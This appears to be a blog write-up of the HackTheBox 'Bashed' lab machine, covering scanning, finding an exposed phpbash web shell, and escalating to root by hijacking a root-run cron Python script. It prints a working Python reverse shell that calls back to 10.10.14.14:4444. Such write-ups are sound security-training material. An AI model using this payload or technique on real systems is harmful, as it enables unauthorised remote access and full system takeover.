---
aliases: ["Bashed","bashed"]
title: "Bashed"
description: "Writeup for Bashed machine from HTB"
date: 2020-09-04
lastmod: 2020-09-04
author: "Pablo Jesús González Rubio"
cover: "bashed.png"
coverAlt: "Bashed icon"
toc: true
tags: [ "Writeup" ]
---

> `fast-nmap` and `gobusterdefault` are aliases from [this gist](https://gist.github.com/n0nuser/34fc14a084436ae89c2b3405ad453f0a).

## Scanning

I've put the machine IP in `/etc/hosts` for easy access:

```
10.10.10.68 bashed.htb
```

Then I've run my alias for Nmap:

```
fast-nmap bashed.htb
```

Output:

```
[*] Full TCP Scan
Open ports: 80
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

## Enumeration

The HTTP port is open so there's a web server:

{{< img "page.png" "Page" "border" >}}

The page tells us about a pentesting tool that could come in handy, searching for it this [repository](https://github.com/Arrexel/phpbash) appears.

> Curious Fact: Arrexel is the CEO of HackTheBox and creates machines like this one. Just to correlate the repository with the machine. 😁

At this time gobuster (`gobusterdefault bashed.htb`) scan is more or less done and throws:

```
/contact.html (Status: 200)
/images/ (Status: 200)
/icons/ (Status: 403)
/index.html (Status: 200)
/uploads/ (Status: 200)
/about.html (Status: 200)
/php/ (Status: 200)
/css/ (Status: 200)
/dev/ (Status: 200)
/js/ (Status: 200)
/config.php (Status: 200)
/fonts/ (Status: 200)
/single.html (Status: 200)
/scroll.html (Status: 200)
```

Let's check if that PHP backdoor exists in any of the directories we've found.

As he says he has developed it in this exact server and there's a "dev" directory maybe we can find it there:

{{< img "dev.png" "Dev" "border" >}}

¡Boom!

Let's throw some reverse shell and the usual TTY method:

{{< img "reverse.png" "Reverse" "border" >}}

After that, I went to **Arrexel**'s user directory `/home/Arrexel` where there's the `user.txt` with world read access.

{{< img "user.png" "User" "border" >}}

At this moment I tried to privesc to another user so I checked what commands I could run with `sudo`:

{{< img "sudo.png" "Sudo" "border" >}}

This means we execute commands as **scriptmanager** user without any password asked. For example:

```
sudo -u scriptmanager whoami
```

That returns `scriptmanager`.

Looking around the directories I notice `/scripts` at the root directory, where usually there are only OS directories like the `etc`, `dev`, `var`, etc.

We can't enter (but read) as **www-data** because it's owned by **scriptmanager**:

{{< img "scripts.png" "Scripts" "border" >}}

So I just "sudo" as **scriptmanager** to be able to fully interact with the directory and not just read it:

{{< img "listScripts.png" "List Scripts" "border" >}}

{{< img "read.png" "Read" "border" >}}

That Python script just overwrites `test.txt`. Looking closely the `test.txt` is owned by **root** and not by **scriptmanager**, so that means the script is being run as root, probably in a cronjob.

## Privilege Escalation (Root)

To escalate this we can modify the `test.py` as **scriptmanager** inputting a reverse shell that will grant us full access:

```
sudo -u scriptmanager nano /scripts/test.py
```

And this reverse shell:

```python
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.14",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
```

Now we just have to wait with netcat:

{{< img "root.png" "Root!" "border" >}}

Rooted! 🔓️